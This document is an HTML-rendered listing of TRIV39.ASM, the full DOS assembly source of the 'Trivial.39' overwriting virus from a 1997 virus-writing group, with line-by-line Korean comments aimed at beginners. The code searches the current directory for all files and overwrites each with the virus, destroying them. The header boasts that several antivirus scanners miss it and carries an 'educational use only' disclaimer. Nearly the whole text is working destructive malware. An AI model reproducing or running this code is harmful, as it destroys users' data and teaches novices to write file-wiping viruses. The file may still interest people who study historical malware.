<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>TRIV39.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                         Trivial.39                           CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  VirusName : Trivial.39</span><span class="sc0">
</span><span class="sc1">;  Author : Osiris</span><span class="sc0">
</span><span class="sc1">;  Group : CVC (Corean Virus Club) / Corea</span><span class="sc0">
</span><span class="sc1">;  Date : 1997/08/15</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Type : Non Resident  Overwriting</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  for Beginers</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  From the Corean Virus Factory !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  비상주형 겹쳐쓰기 바이러스이다. 가장 간단한 바이러스로 현재 디렉토리의</span><span class="sc0">
</span><span class="sc1">;  모든 파일을 파괴한다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  AVP,FINDVIRU,F-PROT,SCAN,V3PRO 에서 진단되지 않는다.</span><span class="sc0">
</span><span class="sc1">;  단, TBAV 에서만 Vorbis.155/166 로 진단된다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  !! 주의 !!</span><span class="sc0">
</span><span class="sc1">;  본 소스는 오직 교육용으로만 사용되어야 합니다. 본 소스로 인해 발생한 모든</span><span class="sc0">
</span><span class="sc1">;  문제의 책임은 사용자에게 있으며 제작자는 어떠한 책임도 지지 않습니다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                   (c) Copyleft 1997 by Osiris of CVC, COREA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">

 </span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">
 </span><span class="sc9">.CODE</span><span class="sc0">
  </span><span class="sc9">ORG</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">

 </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                    </span><span class="sc1">; AH = 4Eh (파일 찾기)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; CX = 파일 속성</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mask_all</span><span class="sc0">              </span><span class="sc1">; DX = 찾을 파일 (*.* : 모든 파일)</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">; 실행 !</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Done</span><span class="sc0">                      </span><span class="sc1">; 에러 인가 ?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                    </span><span class="sc1">; 파일 생성</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">                  </span><span class="sc1">; 기본 DTA 값은 0080h 이다. +1Eh 가</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">; 파일 이름이므로 9Eh 는 파일 이름이</span><span class="sc0">
                                        </span><span class="sc1">; 존재한다.</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; AX,BX 값을 교환한다. 1 바이트 짜리</span><span class="sc0">
                                        </span><span class="sc1">; 명령이며 BX 는 파일 핸들을 가지게</span><span class="sc0">
                                        </span><span class="sc1">; 된다.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                    </span><span class="sc1">; 파일 쓰기</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Trivial</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">   </span><span class="sc1">; 크기</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                   </span><span class="sc1">; 쓸 오프셋 주소값</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;       mov   ah,3Eh                    ; 파일 닫기</span><span class="sc0">
</span><span class="sc1">;       int   21h                       ; 없어도 별 문제 없음</span><span class="sc0">
</span><span class="sc1">;       하지만, 감염 시킬 파일 갯수가 많으면 문제가 생길 수 있음</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                    </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Done</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; PSP:0 값은 CD 20h 즉 Int 20h 이다.</span><span class="sc0">
                                        </span><span class="sc1">; 프로그램이 종료된다.</span><span class="sc0">
 </span><span class="sc5">Mask_All</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                   </span><span class="sc1">; 모든 파일 찾기</span><span class="sc0">
 </span><span class="sc5">End_Trivial</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0">    </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
